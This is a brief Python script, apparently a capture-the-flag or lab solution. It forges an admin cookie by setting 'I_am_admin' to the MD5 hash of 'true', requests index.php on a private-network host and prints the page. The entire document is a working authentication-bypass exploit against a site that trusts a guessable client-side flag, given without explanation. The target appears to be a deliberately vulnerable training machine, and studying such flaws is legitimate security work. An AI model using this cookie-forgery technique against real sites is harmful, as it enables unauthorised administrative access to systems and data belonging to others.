import requests
import hashlib

admin_cookie = hashlib.md5("true".encode()).hexdigest()
cookies = {'I_am_admin': admin_cookie}
r = requests.get('http://192.168.1.37/index.php', cookies=cookies)
print(r.text)
